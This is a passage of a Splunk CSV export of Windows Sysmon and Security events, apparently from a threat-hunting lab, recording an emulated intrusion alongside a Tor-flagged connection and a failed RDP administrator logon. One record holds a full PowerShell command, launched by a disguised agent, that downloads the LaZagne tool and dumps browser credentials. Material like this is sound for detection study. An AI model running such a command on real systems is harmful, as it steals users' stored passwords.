Name='CurrentDirectory'>C:\Users\inf808\Desktop\</Data><Data Name='User'>WindowsTarget\inf808</Data><Data Name='LogonGuid'>{8e02ef74-4233-675b-e1fd-1f0000000000}</Data><Data Name='LogonId'>0x1ffde1</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6</Data><Data Name='ParentProcessGuid'>{8e02ef74-585e-675b-6007-000000002a00}</Data><Data Name='ParentProcessId'>11700</Data><Data Name='ParentImage'>C:\Users\Public\splunkd.exe</Data><Data Name='ParentCommandLine'>""C:\Users\Public\splunkd.exe"" -server http://10.0.0.4:8888 -group red </Data><Data Name='ParentUser'>WindowsTarget\inf808</Data></EventData></Event>","2024-12-12T16:59:41.000-0500",allowed,,,,,,,,,,,WindowsTarget,,,,,,,WindowsTarget,,WindowsTarget,99886,"endpoint_services_processes ms-sysmon-process windows_event_signature windows_ta_data",,,,,,,,WindowsTarget,,,99886,main,1,,,,,,,,,,,,,"PowerShell.EXE","Microsoft Windows","""C:\Users\Public\splunkd.exe"" -server http://10.0.0.4:8888 -group red","splunkd.exe","{8e02ef74-585e-675b-6007-000000002a00}",11700,"splunkd.exe","C:\Users\Public\splunkd.exe",,,,"powershell.exe -ExecutionPolicy Bypass -C ""$username = $env:USERNAME;$StageDir = \""C:\Users\$username\AppData\Local\$username\"";Invoke-WebRequest \""https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe\"" -OutFile \""$StageDir\LaZagne.exe\"";cmd /c \""$StageDir\LaZagne.exe browsers &gt; \""$StageDir\T1555003LaZagne_output.txt\""\""""","C:\Users\inf808\Desktop\","powershell.exe","{8e02ef74-5ccd-675b-5508-000000002a00}","MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6",10624,High,"powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",,,,"<_='://../////'><><_='--'_='{----}'/><></><></><><",,,,,,,,,,,,,,,,,,,,,,informational,4,"Process creation",1,"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",XmlWinEventLog,FedoraThreatHunting,,,,,,,,,,,,,,,,,,,,,"process
report
track_event_signatures",,,,"process
report
track_event_signatures",,,,,,,,,inf808,,,"'S-1-5-18'",,,,,"Microsoft Sysmon"
,,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",,,,,,,,,WindowsTarget,,,,,,,,"-","192.168.1.4",false,9001,"-",,,,,,"Microsoft-Windows-Sysmon/Operational",3,"<Data Name='RuleName'>Tor</Data><Data Name='UtcTime'>2024-12-12 21:59:31.145</Data><Data Name='ProcessGuid'>{8e02ef74-5344-675b-2706-000000002a00}</Data><Data Name='ProcessId'>9752</Data><Data Name='Image'>C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='Protocol'>tcp</Data><Data Name='Initiated'>true</Data><Data Name='SourceIsIpv6'>false</Data><Data Name='SourceIp'>10.0.0.5</Data><Data Name='SourceHostname'>WindowsTarget.gwvavixz1yzuxgweuyqj3hytvf.ux.internal.cloudapp.net</Data><Data Name='SourcePort'>54486</Data><Data Name='SourcePortName'>-</Data><Data Name='DestinationIsIpv6'>false</Data><Data Name='DestinationIp'>192.168.1.4</Data><Data Name='DestinationHostname'>-</Data><Data Name='DestinationPort'>9001</Data><Data Name='DestinationPortName'>-</Data>","Network connection",3,99885,,,,,,,,,,,"'{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'",,,,,"C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe",,,true,,,,,0x8000000000000000,4,,,,,,,,,,,,,,,,,,,,"'Microsoft-Windows-Sysmon'",,,,,,,,,,,,,0,,,,,,,,,,,,,,"{8e02ef74-5344-675b-2706-000000002a00}","'3780'",9752,,,,,,tcp,,,,99885,99885,,,,,Tor,,,,,"S-1-5-18",,"WindowsTarget.gwvavixz1yzuxgweuyqj3hytvf.ux.internal.cloudapp.net","10.0.0.5",false,,54486,"-",,,,,,,,,,,,,,,"'2024-12-12T21:59:32.9698387Z'","<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T21:59:32.9698387Z'/><EventRecordID>99885</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='3880'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/>",,,,,,,,,,,,,,,,,3,Printers,,"'3880'","2024-12-12T21:59:32.9698387Z",,,,,"NT AUTHORITY\SYSTEM","'S-1-5-18'",,,,,,,,,,"2024-12-12 21:59:31.145",5,,,,,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T21:59:32.9698387Z'/><EventRecordID>99885</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='3880'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>Tor</Data><Data Name='UtcTime'>2024-12-12 21:59:31.145</Data><Data Name='ProcessGuid'>{8e02ef74-5344-675b-2706-000000002a00}</Data><Data Name='ProcessId'>9752</Data><Data Name='Image'>C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='Protocol'>tcp</Data><Data Name='Initiated'>true</Data><Data Name='SourceIsIpv6'>false</Data><Data Name='SourceIp'>10.0.0.5</Data><Data Name='SourceHostname'>WindowsTarget.gwvavixz1yzuxgweuyqj3hytvf.ux.internal.cloudapp.net</Data><Data Name='SourcePort'>54486</Data><Data Name='SourcePortName'>-</Data><Data Name='DestinationIsIpv6'>false</Data><Data Name='DestinationIp'>192.168.1.4</Data><Data Name='DestinationHostname'>-</Data><Data Name='DestinationPort'>9001</Data><Data Name='DestinationPortName'>-</Data></EventData></Event>","2024-12-12T16:59:32.000-0500",allowed,,,"C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe",,,,,,"2024-12-12 21:59:31.145",,"192.168.1.4",,"192.168.1.4",,,9001,outbound,WindowsTarget,"10.0.0.5",WindowsTarget,99885,"endpoint_services_processes ms-sysmon-network windows_event_signature windows_ta_data",,,,,,,,WindowsTarget,,,99885,main,1,,,,,,,,,,,,,,,,,,,,,,,,,,"splunkd.exe","{8e02ef74-5344-675b-2706-000000002a00}",,9752,,"splunkd.exe",,,ip,ipv4,"<_='://../////'><><_='--'_='{----}'/><></><></><><",,,,,,,,,,,,,Tor,,,,,,,,,informational,4,"Network connection",3,"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",XmlWinEventLog,FedoraThreatHunting,,"WindowsTarget.gwvavixz1yzuxgweuyqj3hytvf.ux.internal.cloudapp.net",,,"WindowsTarget.gwvavixz1yzuxgweuyqj3hytvf.ux.internal.cloudapp.net","10.0.0.5",,,,54486,,,,,established,,,,,,"communicate
network
track_event_signatures",,,,"communicate
network
track_event_signatures",,,tcp,"tcp/9001",,,,,SYSTEM,,,"'S-1-5-18'",,,,,"Microsoft Sysmon"
,,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",,,,,,,,,WindowsTarget,,,,,,,,"WindowsTarget.gwvavixz1yzuxgweuyqj3hytvf.ux.internal.cloudapp.net","10.0.0.5",false,3389,"ms-wbt-server",,,,,,"Microsoft-Windows-Sysmon/Operational",3,"<Data Name='RuleName'>RDP</Data><Data Name='UtcTime'>2024-12-12 21:59:28.155</Data><Data Name='ProcessGuid'>{8e02ef74-3d4b-675b-1200-000000002a00}</Data><Data Name='ProcessId'>792</Data><Data Name='Image'>C:\Windows\System32\svchost.exe</Data><Data Name='User'>NT AUTHORITY\NETWORK SERVICE</Data><Data Name='Protocol'>tcp</Data><Data Name='Initiated'>false</Data><Data Name='SourceIsIpv6'>false</Data><Data Name='SourceIp'>139.59.111.167</Data><Data Name='SourceHostname'>-</Data><Data Name='SourcePort'>57117</Data><Data Name='SourcePortName'>-</Data><Data Name='DestinationIsIpv6'>false</Data><Data Name='DestinationIp'>10.0.0.5</Data><Data Name='DestinationHostname'>WindowsTarget.gwvavixz1yzuxgweuyqj3hytvf.ux.internal.cloudapp.net</Data><Data Name='DestinationPort'>3389</Data><Data Name='DestinationPortName'>ms-wbt-server</Data>","Network connection",3,99884,,,,,,,,,,,"'{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'",,,,,"C:\Windows\System32\svchost.exe",,,false,,,,,0x8000000000000000,4,,,,,,,,,,,,,,,,,,,,"'Microsoft-Windows-Sysmon'",,,,,,,,,,,,,0,,,,,,,,,,,,,,"{8e02ef74-3d4b-675b-1200-000000002a00}","'3780'",792,,,,,,tcp,,,,99884,99884,,,,,RDP,,,,,"S-1-5-18",,"-","139.59.111.167",false,,57117,"-",,,,,,,,,,,,,,,"'2024-12-12T21:59:30.1561711Z'","<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T21:59:30.1561711Z'/><EventRecordID>99884</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='3880'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/>",,,,,,,,,,,,,,,,,3,Printers,,"'3880'","2024-12-12T21:59:30.1561711Z",,,,,"NT AUTHORITY\NETWORK SERVICE","'S-1-5-18'",,,,,,,,,,"2024-12-12 21:59:28.155",5,,,,,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T21:59:30.1561711Z'/><EventRecordID>99884</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='3880'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>RDP</Data><Data Name='UtcTime'>2024-12-12 21:59:28.155</Data><Data Name='ProcessGuid'>{8e02ef74-3d4b-675b-1200-000000002a00}</Data><Data Name='ProcessId'>792</Data><Data Name='Image'>C:\Windows\System32\svchost.exe</Data><Data Name='User'>NT AUTHORITY\NETWORK SERVICE</Data><Data Name='Protocol'>tcp</Data><Data Name='Initiated'>false</Data><Data Name='SourceIsIpv6'>false</Data><Data Name='SourceIp'>139.59.111.167</Data><Data Name='SourceHostname'>-</Data><Data Name='SourcePort'>57117</Data><Data Name='SourcePortName'>-</Data><Data Name='DestinationIsIpv6'>false</Data><Data Name='DestinationIp'>10.0.0.5</Data><Data Name='DestinationHostname'>WindowsTarget.gwvavixz1yzuxgweuyqj3hytvf.ux.internal.cloudapp.net</Data><Data Name='DestinationPort'>3389</Data><Data Name='DestinationPortName'>ms-wbt-server</Data></EventData></Event>","2024-12-12T16:59:30.000-0500",allowed,,,"C:\Windows\System32\svchost.exe",,,,,,"2024-12-12 21:59:28.155",,"WindowsTarget.gwvavixz1yzuxgweuyqj3hytvf.ux.internal.cloudapp.net","WindowsTarget.gwvavixz1yzuxgweuyqj3hytvf.ux.internal.cloudapp.net","10.0.0.5",,,3389,inbound,WindowsTarget,"139.59.111.167",WindowsTarget,99884,"endpoint_services_processes ms-sysmon-network windows_event_signature windows_ta_data",,,,,,,,WindowsTarget,,,99884,main,1,,,,,,,,,,,,,,,,,,,,,,,,,,"svchost.exe","{8e02ef74-3d4b-675b-1200-000000002a00}",,792,,"svchost.exe",,,ip,ipv4,"<_='://../////'><><_='--'_='{----}'/><></><></><><",,,,,,,,,,,,,RDP,,,,,,,,,informational,4,"Network connection",3,"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",XmlWinEventLog,FedoraThreatHunting,,"139.59.111.167",,,,"139.59.111.167",,,,57117,,,,,established,,,,,,"communicate
network
track_event_signatures",,,,"communicate
network
track_event_signatures",,,tcp,"tcp/3389",,,,,"NETWORK SERVICE",,,"'S-1-5-18'",,,,,"Microsoft Sysmon"
"-",,"-
administrator",,,NTLM,,,,,0x0,"-",,,,,,,,,,,,,,WindowsTarget,,,,,,,,,,,,,,,,0xC000006D,,4625,,,,,0,"Unknown user name or bad password.",,,,,,,,,,,,,,,,,,,,,0,"Audit Failure",,,Security,,,,,,,0x0,NtLmSsp,3,,,,,,,,"An account failed to log on.

Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Type:			3

Account For Which Logon Failed:
	Security ID:		S-1-0-0
	Account Name:		administrator
	Account Domain:		

Failure Information:
	Failure Reason:		Unknown user name or bad password.
	Status:			0xC000006D
	Sub Status:		0xC0000064

Process Information:
	Caller Process ID:	0x0
	Caller Process Name:	-

Network Information:
	Workstation Name:	workstation
	Source Network Address:	139.59.111.167
	Source Port:		0

Detailed Authentication Information:
	Logon Process:		NtLmSsp 
	Authentication Package:	NTLM
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon request fails. It is generated on the computer where access was attempted.

The Subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The Logon Type field indicates the kind of logon that was requested. The most common types are 2 (interactive) and 3 (network).

The Process Information fields indicate which account and process on the system requested the logon.

The Network Information fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The authentication information fields provide detailed information about this specific logon request.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.",,,,,,,,,,,,,Info,,,"-",,,,,,,,,,,,,,,,,,,,,,,,,42793,,,,,,,,,,,"S-1-0-0
S-1-0-0",,,,"Microsoft Windows security auditing.",,,"139.59.111.167",0,,0xC000006D,,0xC0000064,,,,"-","-",0x0,"S-1-0-0",,,,,,,,,,,,,,,,,,,,,Logon,,,,,,"-",Information,,,,,,,,,,,,,,,,,workstation,"12/12/2024 09:59:29 PM
LogName=Security
EventCode=4625
EventType=0
ComputerName=WindowsTarget
SourceName=Microsoft Windows security auditing.
Type=Information
RecordNumber=42793
Keywords=Audit Failure
TaskCategory=Logon
OpCode=Info
Message=An account failed to log on.

Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Type:			3

Account For Which Logon Failed:
	Security ID:		S-1-0-0
	Account Name:		administrator
	Account Domain:		

Failure Information:
	Failure Reason:		Unknown user name or bad password.
	Status:			0xC000006D
	Sub Status:		0xC0000064

Process Information:
	Caller Process ID:	0x0
	Caller Process Name:	-

Network Information:
	Workstation Name:	workstation
	Source Network Address:	139.59.111.167
	Source Port:		0

Detailed Authentication Information:
	Logon Process:		NtLmSsp 
	Authentication Package:	NTLM
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon request fails. It is generated on the computer where access was attempted.

The Subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The Logon Type field indicates the kind of logon that was requested. The most common types are 2 (interactive) and 3 (network).

The Process Information fields indicate which account and process on the system requested the logon.

The Network Information fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The authentication information fields provide detailed information about this specific logon request.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.","2024-12-12T16:59:29.000-0500",failure,,,"win:remote",NTLM,"An account failed to log on.

Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Type:			3

Account For Which Logon Failed:
	Security ID:		S-1-0-0
	Account Name:		administrator
	Account Domain:		

Failure Information:
	Failure Reason:		Unknown user name or bad password.
	Status:			0xC000006D
	Sub Status:		0xC0000064

Process Information:
	Caller Process ID:	0x0
	Caller Process Name:	-

Network Information:
	Workstation Name:	workstation
	Source Network Address:	139.59.111.167
	Source Port:		0

Detailed Authentication Information:
	Logon Process:		NtLmSsp 
	Authentication Package:	NTLM
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon request fails. It is generated on the computer where access was attempted.

The Subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The Logon Type field indicates the kind of logon that was requested. The most common types are 2 (interactive) and 3 (network).

The Process Information fields indicate which account and process on the system requested the logon.

The Network Information fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The authentication information fields provide detailed information about this specific logon request.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.",Logon,,,,,WindowsTarget,,,,WindowsTarget,,,WindowsTarget,,WindowsTarget,42793,"endpoint_services_processes err0r windows_event_signature windows_logon_failure windows_security_authentication windows_ta_data wineventlog_security wineventlog_windows winsec",,,,,,,,WindowsTarget,,,42793,main,61,,,"-
administrator","S-1-0-0
S-1-0-0",,,"User logon with misspelled or bad user account",,,,,,,,,,,,,,,,,,,,,,0x0,,,,Windows,,,"//_::_=====___.===_===_____.\r\r:\rt_:tt---\rt_:tt-\rt_",,,,,,,,,,,,,,,,,,,,,0x0,informational,0,"User logon with misspelled or bad user account",4625,"WinEventLog:Security",WinEventLog,FedoraThreatHunting,,workstation,,,,"139.59.111.167",,"S-1-0-0",workstation,0,"S-1-0-0",,,,,failure,"User logon with misspelled or bad user account",failure,,0xC000006D,"authentication
error
failure
os
remote
security
track_event_signatures
windows",,failure,remote,"authentication
error
os
security
track_event_signatures
windows",,,,,,,,,administrator,,,,,,Microsoft,,"Microsoft Windows"
,,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",,,,,,,"""C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe"" --ps2","-",WindowsTarget,,,,,"C:\Windows\system32\","-",,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",1,"<Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 21:59:16.924</Data><Data Name='ProcessGuid'>{8e02ef74-5cb4-675b-5408-000000002a00}</Data><Data Name='ProcessId'>10512</Data><Data Name='Image'>C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>-</Data><Data Name='CommandLine'>""C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe"" --ps2</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{8e02ef74-3d4a-675b-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=D925619A15C4DB19DBDBA44C5322F8F8,SHA256=849A77400227F8B844EF38A3D11BBD558DBC2FE4D5AAB5DCA82ADE4DA040AFBD,IMPHASH=CF14D28467DD4FEF75398156A8E6A19A</Data><Data Name='ParentProcessGuid'>{8e02ef74-5344-675b-2706-000000002a00}</Data><Data Name='ParentProcessId'>9752</Data><Data Name='ParentImage'>C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe</Data><Data Name='ParentCommandLine'>""C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe"" service</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data>","Process creation",1,99883,,,"-",,,,,,,,"'{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'","MD5=D925619A15C4DB19DBDBA44C5322F8F8,SHA256=849A77400227F8B844EF38A3D11BBD558DBC2FE4D5AAB5DCA82ADE4DA040AFBD,IMPHASH=CF14D28467DD4FEF75398156A8E6A19A",,,CF14D28467DD4FEF75398156A8E6A19A,"C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe",,,,System,,,,0x8000000000000000,4,,,"{8e02ef74-3d4a-675b-e703-000000000000}",0x3e7,,,,,,,,,D925619A15C4DB19DBDBA44C5322F8F8,,,,,,,"'Microsoft-Windows-Sysmon'",,,,,,,,,,,,,0,"-",,"""C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe"" service","C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe","{8e02ef74-5344-675b-2706-000000002a00}",9752,"NT AUTHORITY\SYSTEM",,,,,,,"{8e02ef74-5cb4-675b-5408-000000002a00}","'3780'",10512,,,,"-",,,,,,99883,99883,,,,,"-",,849A77400227F8B844EF38A3D11BBD558DBC2FE4D5AAB5DCA82ADE4DA040AFBD,,,"S-1-5-18",,,,,,,,,,,,,,,,,,,,,,"'2024-12-12T21:59:16.9253330Z'","<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T21:59:16.9253330Z'/><EventRecordID>99883</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/>",,,,,,,,,,,,,,,,,1,Devices,0,"'5104'","2024-12-12T21:59:16.9253330Z",,,,,"NT AUTHORITY\SYSTEM","'S-1-5-18'",,,,,,,,,,"2024-12-12 21:59:16.924",5,,,,,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T21:59:16.9253330Z'/><EventRecordID>99883</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 21:59:16.924</Data><Data Name='ProcessGuid'>{8e02ef74-5cb4-675b-5408-000000002a00}</Data><Data Name='ProcessId'>10512</Data><Data Name='Image'>C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>-</Data><Data Name='CommandLine'>""C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe"" --ps2</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{8e02ef74-3d4a-675b-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=D925619A15C4DB19DBDBA44C5322F8F8,SHA256=849A77400227F8B844EF38A3D11BBD558DBC2FE4D5AAB5DCA82ADE4DA040AFBD,IMPHASH=CF14D28467DD4FEF75398156A8E6A19A</Data><Data Name='ParentProcessGuid'>{8e02ef74-5344-675b-2706-000000002a00}</Data><Data Name='ParentProcessId'>9752</Data><Data Name='ParentImage'>C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe</Data><Data Name='ParentCommandLine'>""C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe"" service</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data></EventData></Event>","2024-